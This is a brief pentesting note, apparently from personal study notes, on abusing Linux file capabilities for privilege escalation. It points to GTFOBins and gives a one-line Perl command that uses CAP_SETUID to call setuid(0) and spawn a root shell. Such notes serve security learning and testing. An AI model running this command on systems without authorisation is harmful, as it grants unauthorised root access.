# Capabilties

Capabilities is a well known attack vector. [GTFOBins](https://gtfobins.github.io/) has lots of really good information about the many UNIX/Linux binaries that can be abused.

#### Perl

[This](https://gtfobins.github.io/gtfobins/perl) section talks about Perl and what you can do with CAP\_SETUID being set.

If it's set:

```bash
/usr/bin/perl = cap_setuid+ep
```

Then do this:

```
./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```
